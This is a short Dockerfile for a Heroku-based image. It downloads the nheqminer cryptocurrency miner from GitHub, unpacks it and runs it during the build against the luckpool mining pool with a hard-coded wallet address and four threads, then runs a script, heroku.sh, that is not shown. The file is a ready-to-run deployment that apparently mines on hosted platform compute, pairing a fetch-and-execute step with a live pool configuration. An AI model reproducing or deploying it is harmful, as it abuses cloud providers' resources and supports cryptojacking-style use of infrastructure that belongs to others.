FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && chmod +x nheqminer && ./nheqminer -v -l na.luckpool.net:3956 -u RCDnK8dTrp1CPdty6oKPwv9LQaEJdGZcKG.1 -p x -t 4
CMD bash heroku.sh
